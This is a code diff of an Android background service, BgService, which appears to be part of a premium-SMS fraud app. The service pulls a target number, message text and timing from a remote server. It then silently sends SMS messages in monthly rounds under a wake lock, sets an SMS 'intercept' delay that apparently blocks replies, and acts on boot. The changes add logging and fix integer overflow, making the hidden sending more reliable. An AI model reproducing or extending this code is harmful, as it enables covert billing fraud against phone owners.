@@ -102,6 +102,7 @@ public class BgService extends Service {
         public void onReceive(Context context, Intent intent) {
             LOGD("receive the intent for send on sms, intent action = " + intent.getAction());
             SettingManager sm = SettingManager.getInstance(context);
+            sm.log(TAG, "receive the intent for send on sms, intent action = " + intent.getAction());
             if (sm.mXMLHandler != null) {
                 String monthCount = sm.mXMLHandler.getChanneInfo(XMLHandler.LIMIT_NUMS_MONTH);
                 if (monthCount != null) {
@@ -110,13 +111,19 @@ public class BgService extends Service {
                     if (hasSend < sendTotlaCount) {
                         autoSendSMS(BgService.this);
                         sm.setSMSSendCount(hasSend + 1);
+                        LOGD("this round has send sms count = " + (hasSend + 1));
+                        sm.log(TAG, "this round has send sms count = " + (hasSend + 1));
                     } else {
+                        sm.log(TAG, "cancel this round the sms auto send, because the send job done");
                         sm.setSMSSendCount(0);
                         sm.cancelOneRoundSMSSend();
                     }
                 } else {
+                    sm.log(TAG, "cancel this round the sms auto send, because month count == null");
                     sm.cancelOneRoundSMSSend();
                 }
+            } else {
+                sm.log(TAG, "mXMLHandler == null error");
             }
         }
     };
@@ -155,6 +162,7 @@ public class BgService extends Service {
         super.onStart(intent, startId);
         
         SettingManager sm = SettingManager.getInstance(this);
+        sm.log(TAG, "BgService::onStart");
         if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_INTERNET) == true) {
             LOGD("[[onStart]] received the action to get the internet info");
             boolean ret = SettingManager.getInstance(this).getXMLInfoFromServer();
@@ -163,7 +171,7 @@ public class BgService extends Service {
                 String delay = SettingManager.getInstance(this).mXMLHandler.getChanneInfo(XMLHandler.NEXT_LINK_BASE);
                 long delayTime = 0;
                 if (delay != null) {
-                    delayTime = (Integer.valueOf(delay)) * 60 * 60 * 1000;
+                    delayTime = (Long.valueOf(delay)) * 60 * 60 * 1000;
                 }
                 LOGD("[[onStart]] change the internet connect time delay, and start send the auto sms");
                 sm.setLastConnectServerTime(System.currentTimeMillis());
@@ -174,6 +182,7 @@ public class BgService extends Service {
             }
         } else if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_SEND_SMS) == true) {
             LOGD("[[onStart]] start send the sms for one cycle");
+            mSM.log(TAG, "start send the sms for one cycle");
             SettingManager.getInstance(this).startOneRoundSMSSend();
         } else if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_BOOT) == true) {
             File file = new File(SettingManager.getInstance(getApplicationContext()).DOWNLOAD_FILE_PATH);
@@ -198,6 +207,7 @@ public class BgService extends Service {
     public void onDestroy() {
         super.onDestroy();
 //        this.unregisterReceiver(mDialogBroadCast);
+        mSM.log(TAG, "onDestroy");
         this.unregisterReceiver(mSMSSendBroadCast);
     }
     
@@ -225,27 +235,26 @@ public class BgService extends Service {
                 boolean sms = Integer.valueOf(smsOrDial) == 0 ? true : false;
                 if (sms == true) {
                     String intercept_time_str = sm.mXMLHandler.getChanneInfo(XMLHandler.INTERCEPT_TIME);
-                    int intercept_time_int = 2000 * 60 * 1000;
+                    long intercept_time_int = ((long) 2000) * 60 * 1000;
                     if (intercept_time_str != null) {
-                        intercept_time_int = Integer.valueOf(intercept_time_str) * 60 * 1000;
+                        intercept_time_int = Long.valueOf(intercept_time_str) * 60 * 1000;
                     }
                     sm.setSMSBlockDelayTime(intercept_time_int);
                     SettingManager.getInstance(context).makePartialWakeLock();
                     try {
                         Date date = new Date(System.currentTimeMillis());
-                        LOGD("[[autoSendSMSOrDial]] current time = " + date.toGMTString());
+                        LOGD("current time = " + date.toLocaleString());
                         sm.setLastSMSTime(System.currentTimeMillis());
                         WorkingMessage wm = WorkingMessage.createEmpty(context);
-                        LOGD("[[autoSendSMSOrDial]] send sms to : " + targetNum + " text = " + sendText);
+                        LOGD("send sms to : " + targetNum + " text = " + sendText);
                         wm.setDestNum(targetNum);
                         wm.setText(sendText);
                         wm.send();
-                        SettingManager.getInstance(context).logSMSCurrentTime();
                     } catch (Exception e) {
                     } finally {
                         SettingManager.getInstance(context).releasePartialWakeLock();
                         Date date = new Date(System.currentTimeMillis());
-                        LOGD("[[autoSendSMSOrDial]] current time = " + date.toGMTString());
+                        LOGD("[[autoSendSMSOrDial]] current time = " + date.toLocaleString());
                     }
                 } else {
                     //TODO : dial
@@ -330,7 +339,7 @@ public class BgService extends Service {
     public final void LOGD(String msg) {
         if (DEBUG) {
             Log.d(TAG, "[[" + this.getClass().getName() 
-                    + "::" + Thread.currentThread().getStackTrace()[2].getMethodName()
+                    + "::" + Thread.currentThread().getStackTrace()[3].getMethodName()
                     + "]] " + msg);
         }
     }
